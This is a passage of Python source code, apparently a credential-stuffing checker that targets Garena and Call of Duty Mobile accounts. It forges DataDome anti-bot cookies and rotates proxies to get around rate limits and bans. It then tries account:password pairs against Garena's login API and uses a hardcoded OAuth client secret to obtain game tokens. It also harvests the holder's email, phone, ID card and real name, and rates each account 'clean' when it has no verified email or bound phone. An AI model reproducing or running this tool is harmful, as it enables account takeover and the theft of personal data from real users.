--GUtMjwbnuK73qEB7oNcGCkrWIRifDskzeixKidgiNigmMrRjyqpTY5JzLm_ve5vVk-TyzAwmRwLvhANV4XxYjceRTau5XJLv3DjyxcbNZrzAv1KqMtwEdbCI3WJPkmnRe0vII9ipRgFJRZgX7qOOOHtJgKqv34suqJeJG9wRHujcmGr3ac1LhhWcfpDwWKgEPCvajN7o1XRFAt3JPPaXLclHCNZQD42O1-KieWNYscwhh0O1x8ozs5kx_JkmseBN3PH-VfehO38OgJnIh0EaHHjNxk25O04Y3pE46qOc3Xjrod7Z9zDA5EpjZZ2qP6-sYiGw0CDijEQ95w_EfF7EeZUwxGO1t0oIRp6XqrwG1D4FE_vTW84oJIW-jHPRUfK8HzGUyLJQWvsxxJgObltbdveTkynGZAarATYYprb6WEEULjJLjatZ2KTT3jJLBlAJ2RsbKLODGNgdoILt1gdxeyp-hBgOtPdINpbeTBXeK5uevKYM9z_jvctNj3m-dy03Xz6xKd0ZWT55Kobr1TyddHokG_lJDFFeZYjeHu9u7JWv2fYjpls1BAp8_paDg66fS6bJ_DjpMuqY1SchS0Ce0SmFuu9UcxGYVkeCox47zEMxFqTYNIfCVlIonJBu1SLs1_t4CgS1bLsbCrxCie6gnwYlj9x1NN-gwpzKTMowcH9mjJmEmhX_4s6f6tWU3CNNHZXESdtMqbZ8favw1y2_yQ8-gCoVF3iCMAJI5xCTyyWrM9Mir_DczIKoc4nGP4NWZ2ATyI01OB6Z2ZcbrndXeKsPUXqII8-OYwW3gJxGFOlOPFfq2CAldYjyzP9r5VLYbGQnelUtvE9GWSwfYYYPD_p3BAFs3GQ57ndvkxcTA8BtzXMdPucKaNmJIJi1IvbA4dnjAGqAyhlpeesEHHwG5hK7LAvMfbFtNiBjltzAPGjYwqxidr3bL-ANw08woJR8j9Tq7ENDXbqsi77YHI95srjtah_l4aiCT4zUvdT8e41Z3EsS2dCVG8MuPge5j93H7-Okcau8_-QwzeaW59wZfHfhlNOFgH177W0iFjnjSnA8UWZZ2KdIX9KbsgLUGBrN5U2WT4zjXuh9CbHvxGwpc2YpAKx-FCh1AJUTJzeHuphB7pUIni5ePV5KuCewwyEnXu5BaJbmR3g8YkoXbH9xjXnLy2KgS_OqBhyMt0xwwx7yBac7bPSCnVyZ2qduoGY9O3qZp7IvQ1QsW3ibNch33k8oAZLRjOS_UlfnPeVe3ALGIw2sZOY-06b3cGt9xTqDjDdrGBPuPGVF0y3YEHpVoK5K7KFTubDB_Y8rsdvWane0xkoDoF8M8gq_1E_Wr09TAndPx2lvKVoTLXPgQCH_eNzIds9Ec_I_SdiydIXmSVcv3w7PQyAtmhsK7Ga06gujlMHKri1zK1cDbPJdxeFHW7Bfwnn6Upbij9qHjF4mHYjgHn_zWVQxh4BBnkYsnBtapQOYEfO0MnX8eXhcidk5BeCTk4RC0fKSEp8-2DuDGPdpkHHtEKibkw64Mc41MJ4Tz1mAQKxaXbNa28snq1uonIzOi7P_mf5O6AEHfvN9ONc5oGg9wXcHsknNgICGEvnssQ8avliUyI9tkUxqrIyPn5aBdt2vQtDLKAucioT9bg',
        'eventCounters': '[]',
        'jsType': 'ch',
        'cid': 'ISkde2yWEsap_rca8kFx8KRU7KyOv16N2yKK8zLXVO1Y2Xa2i_akWInfmy~dIlJBLQcPaZq6tXXCwXC4FIo1dLi2ZUonhelNtFSZoyIsDdmX0uxT1InMizbY4~zZh3jJ',
        'ddk': 'AE3F04AD3F0D3A462481A337485081',
        'Referer': 'https://account.garena.com/',
        'request': '/',
        'responsePage': 'origin',
        'ddv': '5.6.6'
    }
    data = '&'.join((f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items()))
    try:
        response = session.post(url, headers=headers, data=data, proxies=proxies, timeout=5)
        response.raise_for_status()
        response_json = response.json()
        if response_json.get('status') == 200 and 'cookie' in response_json:
            cookie_string = response_json['cookie']
            if '=' in cookie_string and ';' in cookie_string:
                datadome = cookie_string.split(';')[0].split('=')[1]
            else:
                datadome = cookie_string
            return datadome
    except Exception:
        pass
    return None

_CAPTCHA_MARKERS = (b'<html', b'<!doctype', b'datadome', b'interstitial', b'captcha', b'robot', b'blocked')
_FAKE_CHECK_BYTES = 200  # was 400 — 200 is enough to detect HTML/captcha markers

def _is_fake_response(response):
    ct = response.headers.get('content-type', '').lower()
    if 'text/html' in ct:
        return True
    raw = response.content[:_FAKE_CHECK_BYTES].lower()
    for marker in _CAPTCHA_MARKERS:
        if marker in raw:
            return True
    return False

def prelogin(session, account, datadome_manager, cookie_manager, retries=6, proxy_manager=None):
    all_403 = True
    saw_network_error = False
    for attempt in range(retries):
        try:
            url = 'https://sso.garena.com/api/prelogin'
            params = {'app_id': '10100', 'account': account, 'format': 'json', 'id': str(int(time.time() * 1000))}
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            for cookie_name in ['apple_state_key', 'datadome', 'sso_key', '_ga', '_ga_XB5PSHEQB4', '_ga_1M7M9L6VPX']:
                if cookie_name in current_cookies:
                    cookie_parts.append(f'{cookie_name}={current_cookies[cookie_name]}')
            cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
            headers = {
                "Host": "sso.garena.com",
                "Connection": "keep-alive",
                "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
                "Accept": "application/json, text/plain, */*",
                "sec-ch-ua-mobile": "?1",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
                "sec-ch-ua-platform": '"Android"',
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-PH",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-PH,en-US;q=0.9,en;q=0.8",
            }
            if cookie_header:
                headers['cookie'] = cookie_header
            _to = 8 if (proxy_manager and proxy_manager.is_loaded()) else 5
            response = session.get(url, headers=headers, params=params, timeout=_to)
            if response.status_code == 403:
                if proxy_manager and proxy_manager.is_loaded():
                    session.proxies.clear()
                    session.proxies.update(proxy_manager.get_next())
                else:
                    proxy_dict = dict(session.proxies) if hasattr(session, 'proxies') and session.proxies else None
                    fresh_dd = get_datadome_cookie(session, proxies=proxy_dict)
                    if fresh_dd:
                        datadome_manager.set_datadome(fresh_dd)
                        datadome_manager.set_session_datadome(session, fresh_dd)
                    else:
                        datadome_manager.handle_403(session)
                if attempt < retries - 1:
                    continue
                all_403 = True
                break
            if response.status_code == 429:
                # rate-limited: rotate the throttled identity instead of waiting on it
                rotated = False
                if proxy_manager and proxy_manager.is_loaded():
                    session.proxies.clear()
                    session.proxies.update(proxy_manager.get_next())
                    rotated = True
                else:
                    picked_ck = cookie_manager.pick_cookie()
                    if picked_ck:
                        applyck(session, picked_ck)
                        val = extract_datadome_token(picked_ck)
                        if val:
                            datadome_manager.set_datadome(val)
                            datadome_manager.set_session_datadome(session, val)
                        rotated = True
                    else:
                        proxy_dict = dict(session.proxies) if hasattr(session, 'proxies') and session.proxies else None
                        fresh_dd = get_datadome_cookie(session, proxies=proxy_dict)
                        if fresh_dd:
                            datadome_manager.set_datadome(fresh_dd)
                            datadome_manager.set_session_datadome(session, fresh_dd)
                            rotated = True
                if not rotated:
                    time.sleep(0.1)
                continue
            response.raise_for_status()
            if _is_fake_response(response):
                bad_dd = session.cookies.get('datadome') or datadome_manager.get_datadome()
                if bad_dd:
                    cookie_manager.mark_banned(bad_dd)
                picked_ck = cookie_manager.pick_cookie()
                if picked_ck:
                    applyck(session, picked_ck)
                    val = extract_datadome_token(picked_ck)
                    if val:
                        datadome_manager.set_datadome(val)
                        datadome_manager.set_session_datadome(session, val)
                else:
                    proxy_dict = dict(session.proxies) if hasattr(session, 'proxies') and session.proxies else None
                    fresh_dd = get_datadome_cookie(session, proxies=proxy_dict)
                    if fresh_dd:
                        datadome_manager.set_datadome(fresh_dd)
                        datadome_manager.set_session_datadome(session, fresh_dd)
                if proxy_manager and proxy_manager.is_loaded():
                    session.proxies.clear()
                    session.proxies.update(proxy_manager.get_next())
                all_403 = False
                if attempt < retries - 1:
                    continue
                return (None, None, None)
            try:
                data = response.json()
            except json.JSONDecodeError:
                all_403 = False
                if proxy_manager and proxy_manager.is_loaded():
                    session.proxies.clear()
                    session.proxies.update(proxy_manager.get_next())
                if attempt < retries - 1:
                    continue
                return (None, None, None)
            new_cookies = response.cookies.get_dict()
            new_datadome = new_cookies.get('datadome')
            if new_datadome:
                datadome_manager.set_datadome(new_datadome)
            if 'error' in data:
                err_code = data['error']
                if err_code == 'error_no_account':
                    return ('NO_ACCOUNT', None, new_datadome)
                elif err_code in ('error_auth', 'error_user_ban', 'error_security_ban'):
                    return ('ERROR_AUTH', err_code, new_datadome)
                else:
                    all_403 = False
                    if attempt < retries - 1:
                        continue
                    return (None, None, None)
            v1 = data.get('v1')
            v2 = data.get('v2')
            if not v1 or not v2:
                all_403 = False
                if attempt < retries - 1:
                    continue
                return (None, None, None)
            return (v1, v2, new_datadome)
        except requests.exceptions.ConnectionError:
            all_403 = False
            saw_network_error = True
            if proxy_manager and proxy_manager.is_loaded():
                session.proxies.clear()
                session.proxies.update(proxy_manager.get_next())
            if attempt < retries - 1:
                continue
        except requests.exceptions.Timeout:
            all_403 = False
            saw_network_error = True
            if proxy_manager and proxy_manager.is_loaded():
                session.proxies.clear()
                session.proxies.update(proxy_manager.get_next())
            if attempt < retries - 1:
                continue
        except requests.exceptions.ProxyError:
            all_403 = False
            saw_network_error = True
            if proxy_manager and proxy_manager.is_loaded():
                session.proxies.clear()
                session.proxies.update(proxy_manager.get_next())
            if attempt < retries - 1:
                continue
        except requests.exceptions.SSLError:
            all_403 = False
            saw_network_error = True
            if proxy_manager and proxy_manager.is_loaded():
                session.proxies.clear()
                session.proxies.update(proxy_manager.get_next())
            if attempt < retries - 1:
                continue
        except Exception:
            all_403 = False
            if attempt < retries - 1:
                continue
    if all_403:
        return ('IP_BLOCKED', None, None)
    if saw_network_error:
        return ('NETWORK_ERROR', None, None)
    return (None, None, None)

def login(session, account, password, v1, v2):
    hashed_password = hash_password(password, v1, v2)
    url = 'https://sso.garena.com/api/login'
    params = {'app_id': '10100', 'account': account, 'password': hashed_password, 'redirect_uri': 'https://account.garena.com/', 'format': 'json', 'id': str(int(time.time() * 1000))}
    current_cookies = session.cookies.get_dict()
    cookie_parts = []
    for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
        if cookie_name in current_cookies:
            cookie_parts.append(f'{cookie_name}={current_cookies[cookie_name]}')
    cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
    headers = {'accept': 'application/json, text/plain, */*', 'referer': 'https://account.garena.com/', 'user-agent': MSDK_UA,
               'sec-ch-ua': MSDK_SEC_CH_UA,
               'sec-ch-ua-platform': '"Android"',
               'sec-ch-ua-mobile': '?1',
               'X-Requested-With': 'com.garena.game.codm'}
    if cookie_header:
        headers['cookie'] = cookie_header
    retries = 3
    for attempt in range(retries):
        try:
            _to = 8
            response = session.get(url, headers=headers, params=params, timeout=_to)
            response.raise_for_status()
            login_cookies = {}
            if 'set-cookie' in response.headers:
                for cookie_str in response.headers['set-cookie'].split(','):
                    if '=' in cookie_str:
                        try:
                            cookie_name = cookie_str.split('=')[0].strip()
                            cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                            if cookie_name and cookie_value:
                                login_cookies[cookie_name] = cookie_value
                        except Exception:
                            pass
            try:
                for k, v in response.cookies.get_dict().items():
                    if k not in login_cookies:
                        login_cookies[k] = v
            except Exception:
                pass
            for k, v in login_cookies.items():
                if k in ['sso_key', 'apple_state_key', 'datadome', 'ac_session', 'session_key']:
                    session.cookies.set(k, v, domain='.garena.com')
            try:
                data = response.json()
            except json.JSONDecodeError:
                if attempt < retries - 1:
                    time.sleep(0.1)
                    continue
                return None

            try:
                _sk_body = data.get('session_key') or data.get('sessionKey') or ''
                if _sk_body:
                    session.cookies.set('session_key', _sk_body, domain='.garena.com')
            except Exception:
                pass

            sso_key = login_cookies.get('sso_key') or response.cookies.get('sso_key')
            if 'error' in data:
                error_msg = data['error']
                if error_msg in ('ACCOUNT DOESNT EXIST', 'error_no_account', 'error_auth', 'error_user_ban', 'error_security_ban'):
                    return f'permanent_fail:{error_msg}'
                if attempt < retries - 1:
                    time.sleep(0.2)
                    continue
                return None
            return sso_key
        except requests.RequestException:
            if attempt < retries - 1:
                time.sleep(0.5)
                continue
    return None

def _generate_device_id():
    import uuid
    return f'02-{uuid.uuid4()}'

def get_codm_grant_code(session):
    for attempt in range(OAUTH_MAX_RETRIES):
        try:
            random_id = str(int(time.time() * 1000))
            grant_url = 'https://100082.connect.garena.com/oauth/token/grant'
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            for name in ['apple_state_key', 'fb_state', 'google_state', 'huawei_state', 'line_state', 'twitter_state', 'vk_state', 'tiktok_state', 'youtube_state', 'sso_key', 'datadome']:
                if name in current_cookies:
                    cookie_parts.append(f'{name}={current_cookies[name]}')
            cookie_header = '; '.join(cookie_parts)
            grant_headers = {'Host': '100082.connect.garena.com', 'Connection': 'keep-alive', 'Accept': 'application/json, text/plain, */*', 'User-Agent': MSDK_UA,
                'sec-ch-ua': MSDK_SEC_CH_UA,
                'sec-ch-ua-platform': '"Android"',
                'sec-ch-ua-mobile': '?1',
                'X-Requested-With': 'com.garena.game.codm', 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8', 'Origin': 'https://100082.connect.garena.com', 'X-Requested-With': 'com.garena.game.codm', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://100082.connect.garena.com/universal/oauth?client_id=100082&locale=en-US&create_grant=true&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'en-US,en;q=0.9'}
            if cookie_header:
                grant_headers['Cookie'] = cookie_header
            grant_body = f'client_id=100082&response_type=code&redirect_uri=gop100082%3A%2F%2Fauth%2F&create_grant=true&login_scenario=normal&format=json&id={random_id}'
            resp = session.post(grant_url, headers=grant_headers, data=grant_body, timeout=6)
            resp.raise_for_status()
            data = resp.json()
            code = data.get('code', '')
            if not code:
                logger.error(f'[ERROR] token/grant returned no code: {data}')
            return code
        except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
            if attempt < OAUTH_MAX_RETRIES - 1:
                delay = OAUTH_RETRY_DELAY * 2 ** attempt
                time.sleep(delay)
                continue
            else:
                logger.error(f'[ERROR] Error in get_codm_grant_code after {OAUTH_MAX_RETRIES} attempts')
                raise
        except Exception as e:
            logger.error(f'[ERROR] Error in get_codm_grant_code (token/grant)')
            return ''
    return ''

def token_exchange(code, device_id=None, proxies=None):
    if not device_id:
        device_id = _generate_device_id()
    if proxies is None:
        proxies = None
    CLIENT_ID = '100082'
    CLIENT_SECRET = '388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415'
    REDIRECT_URI = 'gop100082://auth/'
    exchange_url = 'https://100082.connect.garena.com/oauth/token/exchange'
    exchange_headers = {'User-Agent': MSDK_UA,
                             'sec-ch-ua': MSDK_SEC_CH_UA,
                             'sec-ch-ua-platform': '"Android"',
                             'sec-ch-ua-mobile': '?1',
                             'X-Requested-With': 'com.garena.game.codm', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': '100082.connect.garena.com', 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip'}
    exchange_body = f'grant_type=authorization_code&code={code}&device_id={urllib.parse.quote(device_id)}&redirect_uri={urllib.parse.quote(REDIRECT_URI)}&source=2&client_id={CLIENT_ID}&client_secret={CLIENT_SECRET}'
    for attempt in range(OAUTH_MAX_RETRIES):
        try:
            resp = requests.post(exchange_url, headers=exchange_headers, data=exchange_body, timeout=6, proxies=proxies)
            resp.raise_for_status()
            data = resp.json()
            access_token = data.get('access_token', '')
            if not access_token:
                logger.error(f'[ERROR] token/exchange returned no access_token: {data}')
            return access_token
        except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
            if attempt < OAUTH_MAX_RETRIES - 1:
                delay = OAUTH_RETRY_DELAY * 2 ** attempt
                time.sleep(delay)
                continue
            else:
                logger.error(f'[ERROR] Error in token_exchange after {OAUTH_MAX_RETRIES} attempts')
                raise
        except Exception as e:
            logger.error(f'[ERROR] Error in token_exchange (token/exchange)')
            return ''
    return ''

def get_codm_access_token(session):
    try:
        random_id = str(int(time.time() * 1000))
        grant_url = 'https://100082.connect.garena.com/oauth/token/grant'
        grant_headers = {'Host': '100082.connect.garena.com', 'Connection': 'keep-alive', 'sec-ch-ua-platform': '"Android"', 'User-Agent': MSDK_UA, 'Accept': 'application/json, text/plain, */*', 'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Android WebView";v="144"', 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8', 'sec-ch-ua-mobile': '?1', 'Origin': 'https://100082.connect.garena.com', 'X-Requested-With': 'com.garena.game.codm', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://100082.connect.garena.com/universal/oauth?client_id=100082&locale=en-US&create_grant=true&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code', 'Accept-Encoding': 'gzip, deflate, br, zstd', 'Accept-Language': 'en-US,en;q=0.9'}
        import uuid
        device_id = f'02-{str(uuid.uuid4())}'
        grant_data = f'client_id=100082&redirect_uri=gop100082%3A%2F%2Fauth%2F&response_type=code&id={random_id}'
        grant_response = session.post(grant_url, headers=grant_headers, data=grant_data, timeout=6)
        grant_json = grant_response.json()
        auth_code = grant_json.get('code', '')
        if not auth_code:
            return ('', '', '')
        token_url = 'https://100082.connect.garena.com/oauth/token/exchange'
        token_headers = {'User-Agent': 'GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': '100082.connect.garena.com', 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip'}
        token_data = f'grant_type=authorization_code&code={auth_code}&device_id={device_id}&redirect_uri=gop100082%3A%2F%2Fauth%2F&source=2&client_id=100082&client_secret=388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415'
        token_response = session.post(token_url, headers=token_headers, data=token_data, timeout=6)
        token_json = token_response.json()
        access_token = token_json.get('access_token', '')
        open_id = token_json.get('open_id', '')
        uid = token_json.get('uid', '')
        return (access_token, open_id, uid)
    except Exception:
        return ('', '', '')

def process_codm_callback(session, access_token, open_id=None, uid=None):
    try:
        old_callback_url = f'https://api-delete-request.codm.garena.co.id/oauth/callback/?access_token={access_token}'
        old_headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36', 'referer': 'https://auth.garena.com/'}
        old_response = session.get(old_callback_url, headers=old_headers, allow_redirects=False, timeout=6)
        location = old_response.headers.get('Location', '')
        if 'err=3' in location:
            return (None, 'no_codm')
        elif 'token=' in location:
            token = location.split('token=')[-1].split('&')[0]
            return (token, 'success')
        aos_callback_url = f'https://api-delete-request-aos.codm.garena.co.id/oauth/callback/?access_token={access_token}'
        aos_headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36', 'referer': 'https://100082.connect.garena.com/', 'x-requested-with': 'com.garena.game.codm'}
        aos_response = session.get(aos_callback_url, headers=aos_headers, allow_redirects=False, timeout=6)
        aos_location = aos_response.headers.get('Location', '')
        if 'err=3' in aos_location:
            return (None, 'no_codm')
        elif 'token=' in aos_location:
            token = aos_location.split('token=')[-1].split('&')[0]
            return (token, 'success')
        return (None, 'unknown_error')
    except Exception:
        return (None, 'error')

def get_codm_user_info(session, token):
    try:
        try:
            import base64
            parts = token.split('.')
            if len(parts) == 3:
                payload = parts[1]
                padding = 4 - len(payload) % 4
                if padding != 4:
                    payload += '=' * padding
                decoded = base64.urlsafe_b64decode(payload)
                jwt_data = json.loads(decoded)
                user_data = jwt_data.get('user', {})
                if user_data:
                    return {'codm_nickname': user_data.get('codm_nickname', user_data.get('nickname', 'N/A')), 'codm_level': user_data.get('codm_level', 'N/A'), 'region': user_data.get('region', 'N/A'), 'uid': user_data.get('uid', 'N/A'), 'open_id': user_data.get('open_id', 'N/A'), 't_open_id': user_data.get('t_open_id', 'N/A')}
        except Exception:
            pass
        url = 'https://api-delete-request-aos.codm.garena.co.id/oauth/check_login/'
        headers = {'accept': 'application/json, text/plain, */*', 'codm-delete-token': token, 'origin': 'https://delete-request-aos.codm.garena.co.id', 'referer': 'https://delete-request-aos.codm.garena.co.id/', 'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36', 'x-requested-with': 'com.garena.game.codm'}
        response = session.get(url, headers=headers, timeout=6)
        data = response.json()
        user_data = data.get('user', {})
        if user_data:
            return {'codm_nickname': user_data.get('codm_nickname', 'N/A'), 'codm_level': user_data.get('codm_level', 'N/A'), 'region': user_data.get('region', 'N/A'), 'uid': user_data.get('uid', 'N/A'), 'open_id': user_data.get('open_id', 'N/A'), 't_open_id': user_data.get('t_open_id', 'N/A')}
        return {}
    except Exception:
        return {}

def check_codm_account(session, account):
    codm_info = {}
    has_codm = False
    try:
        access_token, open_id, uid = get_codm_access_token(session)
        if not access_token:
            return (has_codm, codm_info)
        codm_token, status = process_codm_callback(session, access_token, open_id, uid)
        if status == 'no_codm':
            return (has_codm, codm_info)
        elif status != 'success' or not codm_token:
            return (has_codm, codm_info)
        codm_info = get_codm_user_info(session, codm_token)
        if codm_info:
            has_codm = True
    except Exception:
        pass
    return (has_codm, codm_info)

def parse_account_details(data):
    user_info = data.get('user_info', {})
    fb_username = 'N/A'
    fb_uid = 'N/A'
    if user_info.get('fb_account'):
        fb_username = user_info.get('fb_account', {}).get('fb_username', 'N/A')
        fb_uid = user_info.get('fb_account', {}).get('fb_uid', 'N/A')
    account_info = {'uid': user_info.get('uid', 'N/A'), 'username': user_info.get('username', 'N/A'), 'nickname': user_info.get('nickname', 'N/A'), 'email': user_info.get('email', 'N/A'), 'email_verified': bool(user_info.get('email_v', 0)), 'email_verified_time': user_info.get('email_verified_time', 0), 'email_verify_available': bool(user_info.get('email_verify_available', False)), 'security': {'password_strength': user_info.get('password_s', 'N/A'), 'two_step_verify': bool(user_info.get('two_step_verify_enable', 0)), 'authenticator_app': bool(user_info.get('authenticator_enable', 0)), 'facebook_connected': bool(user_info.get('is_fbconnect_enabled', False)), 'facebook_account': user_info.get('fb_account', None), 'suspicious': bool(user_info.get('suspicious', False))}, 'personal': {'real_name': user_info.get('realname', 'N/A'), 'id_card': user_info.get('idcard', 'N/A'), 'id_card_length': user_info.get('idcard_length', 'N/A'), 'country': user_info.get('acc_country', 'N/A'), 'country_code': user_info.get('country_code', 'N/A'), 'mobile_no': user_info.get('mobile_no', 'N/A'), 'mobile_binding_status': 'Bound' if user_info.get('mobile_binding_status', 0) else 'Not Bound', 'extra_data': user_info.get('realinfo_extra_data', {})}, 'profile': {'avatar': user_info.get('avatar', 'N/A'), 'signature': user_info.get('signature', 'N/A'), 'shell_balance': user_info.get('shell', 0)}, 'status': {'account_status': 'Active' if user_info.get('status', 0) == 1 else 'Inactive', 'whitelistable': bool(user_info.get('whitelistable', False)), 'realinfo_updatable': bool(user_info.get('realinfo_updatable', False))}, 'facebook': {'fb_username': fb_username, 'fb_uid': fb_uid}, 'binds': [], 'game_info': []}
    mobile_no = account_info['personal']['mobile_no']
    email_verified = 1 if account_info['email_verified'] else 0
    mobile_is_na = mobile_no == 'N/A' or not mobile_no or str(mobile_no).strip() == ''
    is_clean = mobile_is_na and email_verified == 0
    email = account_info['email']
    id_card = account_info['personal']['id_card']
    if email and email != 'N/A' and str(email).strip() and (not email.startswith('***')):
        if email_verified == 1:
            account_info['binds'].append('Email (Verified)')
        else:
            account_info['binds'].append('Email')
    if not mobile_is_na:
        account_info['binds'].append('Phone')
    if account_info['security']['facebook_connected'] and fb_uid and (fb_uid != 'N/A'):
        account_info['binds'].append('Facebook')
    if id_card and id_card != 'N/A' and str(id_card).strip():
        account_info['binds'].append('ID Card')
    if account_info['security']['two_step_verify']:
        account_info['binds'].append('2FA')
    if account_info['security']['authenticator_app']:
        account_info['binds'].append('Authenticator')
    account_info['bind_status'] = 'Clean' if is_clean else f'Not Clean' if account_info['binds'] else 'Not Clean'
    account_info['is_clean'] = is_clean
    security_indicators = []
    if account_info['security']['two_step_verify']:
        security_indicators.append('2FA')
    if account_info['security']['authenticator_app']:
        security_indicators.append('Auth App')
    if account_info['security']['suspicious']:
        security_indicators.append('[WARNING] Suspicious')
    account_info['security_status'] = '[SUCCESS] Normal' if not security_indicators else ' | '.join(security_indicators)
    return account_info

def display_codm_info(account, password, details, codm_info, has_codm,
                      error_reason=None, game_connections=None, is_elegant=False):
    """Print a result card, then restore the pinned dashboard above/below."""
    global _active_dashboard

    # In dashboard-only mode suppress output unless full mode is on
    if _active_dashboard and _DISPLAY_MODE == 'dashboard' and _BULK_MODE != 'full':
        return

    # ── Color shortcuts
    CY  = '\x1b[38;2;255;215;80m'
    MG  = '\x1b[38;2;255;45;149m'
    GN  = '\x1b[1;92m'
    YL  = '\x1b[1;93m'
    WH  = '\x1b[97m'
    DIM = '\x1b[2m'
    RST = '\x1b[0m'
    SEP65 = DIM + ('\u2501' * 65) + RST   # thick dim rule
    DIV65 = DIM + ('\u2500' * 65) + RST   # thin dim rule

    # ── INVALID path ────────────────────────────────────────────────────
    if details is None:
        if error_reason is None:
            error_reason = 'Incorrect Password'
        line = (f'  \x1b[1;91m\u2716 INVALID\x1b[0m'
                f'  {DIM}\u2502{RST}'
                f'  {WH}{account}:{password}{RST}'
                f'  {DIM}\u2502{RST}'
                f'  \x1b[93m{error_reason}\x1b[0m')
        if _active_dashboard:
            _active_dashboard.print_above(line)
        else:
            with _dash_print_lock:
                _raw_write(line + '\n')
                _raw_flush()
        return

    # ── Gather account fields ────────────────────────────────────────────
    email          = details.get('email', 'N/A')
    email_verified = details.get('email_verified', False)
    username       = details.get('username', 'N/A')
    mobile         = details['personal'].get('mobile_no', 'N/A')
    country_code   = details['personal'].get('country_code', 'N/A')
    shell          = details['profile'].get('shell_balance', 0)
    is_clean       = details.get('is_clean', False)
    bind_status    = 'CLEAN' if is_clean else 'NOT CLEAN'
    formatted_mob  = format_mobile_number(mobile, country_code)

    if email and email != 'N/A' and '@' in email:
        ev_s          = '(Verified)' if email_verified else '(Not Verified)'
        email_display = f'{email} {ev_s}'
    else:
        email_display = 'N/A'

    fb_username = details['facebook'].get('fb_username', 'N/A')
    fb_uid      = details['facebook'].get('fb_uid', 'N/A')
    if not fb_uid or fb_uid == 'N/A':
        fb_info = 'NOT CONNECTED'
    elif not fb_username or fb_username == 'N/A':
        fb_info = 'FB UNBIND or FB DELETED'
    else:
        fb_info = 'CONNECTED'

    login_history   = details.get('login_history', [])
    last_login_info = login_history[0] if login_history else {}
    last_ts         = last_login_info.get('timestamp', 0)
    last_login_date = (time.strftime('%B %d, %Y | %I:%M %p', time.localtime(last_ts))
                       if last_ts else 'N/A')
    last_login_src  = last_login_info.get('source', 'Unknown') if last_login_info else 'Unknown'

    uid = details.get('uid', 'N/A')
    if has_codm and codm_info:
        lvl    = codm_info.get('codm_level', 'N/A')
        server = codm_info.get('region', 'N/A')
        ign    = codm_info.get('codm_nickname', 'N/A')
        uid    = codm_info.get('uid', uid)
    else:
        lvl = server = ign = 'NO CODM'

    st_col = GN if is_clean else YL

    # ── Build card ───────────────────────────────────────────────────────
    B = DIM + '\u2022' + RST   # bullet •
    card_lines = [
        SEP65,
        f'{GN}\u2714 VALID HIT{RST}  {DIM}\u2502{RST}  {WH}{account}:{password}{RST}',
        DIV65,
        f' {B} {CY}Username :{RST} {WH}{username}{RST}',
        f' {B} {CY}Shells   :{RST} {YL}{shell}{RST}',
        f' {B} {CY}Email    :{RST} {WH}{email_display}{RST}',
        f' {B} {CY}Mobile   :{RST} {WH}{formatted_mob}{RST}',
        f' {B} {CY}Facebook :{RST} {WH}{fb_info}{RST}',
        DIV65,
        f' {CY}\u25C8 CODM DETAILS{RST}',
        f' {B} {CY}IGN      :{RST} {WH}{ign}{RST}',
        f' {B} {CY}Level    :{RST} {WH}{lvl}{RST}',
        f' {B} {CY}Server   :{RST} {WH}{server}{RST}',
        f' {B} {CY}UID      :{RST} {WH}{uid}{RST}',
        DIV65,
        f' {B} {CY}Status   :{RST} {st_col}{bind_status}{RST}',
        f' {B} {CY}Last Log :{RST} {WH}{last_login_date}{RST} {DIM}({last_login_src}){RST}',
    ]

    if game_connections:
        card_lines.append(DIV65)
        card_lines.append(f' {MG}\u25C8 OTHER GAMES{RST}')
        for gc in game_connections:
            card_lines.append(
                f' {B} {MG}{gc.get("game","Game")}:{RST} '
                f'{WH}{gc.get("role","Unknown")} ({gc.get("region","N/A")}){RST}'
            )

    card_lines.append(SEP65)

    card_text = '\n'.join(card_lines)

    if _active_dashboard:
